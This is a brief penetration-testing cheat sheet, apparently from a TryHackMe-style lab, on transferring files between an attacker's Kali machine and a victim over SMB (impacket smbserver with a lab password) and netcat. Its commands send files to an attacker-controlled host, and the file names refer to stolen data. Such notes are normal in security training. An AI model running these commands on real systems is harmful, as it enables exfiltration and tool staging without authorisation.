# Transferring Files



## **SMB**

**Kali**

```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

**Victim**

```
copy C:\File\to\tranfer.exe \\$KALI\public\
```

## Netcat

**Victim**

```
nc -nvlp 5050 > stolen.exe
```

**Kali**

```
nc.exe -w3 $VICTIM 5050 < stealme.exe
```



